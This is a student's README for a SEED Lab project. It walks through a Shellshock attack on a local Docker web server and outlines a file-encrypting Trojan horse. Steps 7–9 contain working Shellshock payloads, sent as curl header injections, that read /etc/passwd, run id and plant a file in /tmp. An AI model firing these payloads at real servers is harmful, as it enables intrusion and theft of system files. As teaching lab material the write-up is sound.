
## Work Description

- Shellshock Attack with Reverse Shell <br/>
- Local Client and Server using Socket Programming to demonstrate Trojan Horse Attack <br/>
- Mini Implementation of Trojan Horse to encrpt user all files and to decrypt it with key<br/>

## Prerequisite

- SEED Lab <br/>
- Pyhton3 Install in Virtual machine<br/>
- Cryptography module for encryption module <br/>
- Fernet module of python for encryption & decryption <br/> 


## Steps to Run the ShellShock Attack:

1. ---DNS Setting---<br/>
Check for DNS settings for shellshock Attack using command ```less /etc/hosts```.<br/>
2. ---Container Setup---<br/>
Go in Lab setup and open terminal See if any container is running -> ```docker container list```.<br/>
See if any image is there -> ```docker image list```.<br/>
If you find difficulty For help type command ```docker run --help``` For conatiner help -> ```docker container --help```.<br/>
3. ---Build the container image---<br/>
Build and Run the Docker Compose using ```docker-compose build``` command in the folder after downloading labsetup files.<br/>
4.---Verify---<br/>
Run ```docker-compose up``` to set a trap at apache seed lab it will wait for victim. Check if victim is running ```dockps``` and run docker exec -> ```docksh```.<br/>
5. ---Web Server and CGI---<br/>
Check wheather the getenv and vul.cgi is present using ```ls /usr/lib/cgi-bin/``` <br/>
To check shell shock attack is possible or not I have created two C files ```listcommand.c``` and ```getpid.c``` to check wheather we can get victims shell access.<br/>
6. Run ```sudo cp bash_shellshock /bin/``` to run vulnerable shellshock shell.<br/>
Change permissions using ```sudo chown root vul``` and ```sudo chmod 4755 vul```.<br/>
7. Export a vulnerable function for instance ```export foo='() { echo "normal"; }; /bin/sh'``` and run it using ```./vul```.<br/>
8. ---Passing Data---<br/>
Once we have shell access of user we can use diffrent commands such as ```curl -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi``` to run files which we have created in labsetup folder in webserver using victims shell.<br/>
We can run several command like ```curl -H, e, and A``` to get diffrent infoirmation about users like passwords files or environment variables of victims.<br/> 
To get password file run  ```curl -A"() { echo hello; }; echo Content_type: text/plain; echo; /bin/cat /etc/passwd" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi```.<br/> 
You can verify in victims terminal by running ```cat /etc/passwd```<br/>
To get user process id and pid and gpid run ```curl -e "() { echo hello; }; echo Content_type: text/plain; echo; /bin/id" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi```<br/>
9. We can create a virus folder in victim using ```curl -H "ATTACK: () { echo hello; }; echo Content_type: text/plain; echo; /bin/touch /tmp/virus" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi``` using this folder we will inject our malicious python scripty to encrypt and decrypt users important files. <br/> To check for folder in victims  run ```ls/tmp``` <br/>
10. Finally we can implement our trojan horse attack using the pyhton script uploaded in my github branch.<br/> 

Close lab container  by ```docker-compose down``` <br/>

- Note:  If you have any concern reach me out and if you want contribute kindly open a pull request.


## Reference

- For the implementation of shellshock, seedlab setup is used (https://seedsecuritylabs.org/Labs_20.04/Web/Shellshock/).<br/>
- I have made changes in the docker-compose of the project and also creted several C files to get key information about users like PID GPID or to display users files and folders.<br/>
- The implmentation of trojan horse to encrpy and decrpt files in local Client and server using socket programming is created by me<br/>

## Author

- Fahad Patel - Univerisity of Windsor (110085698)

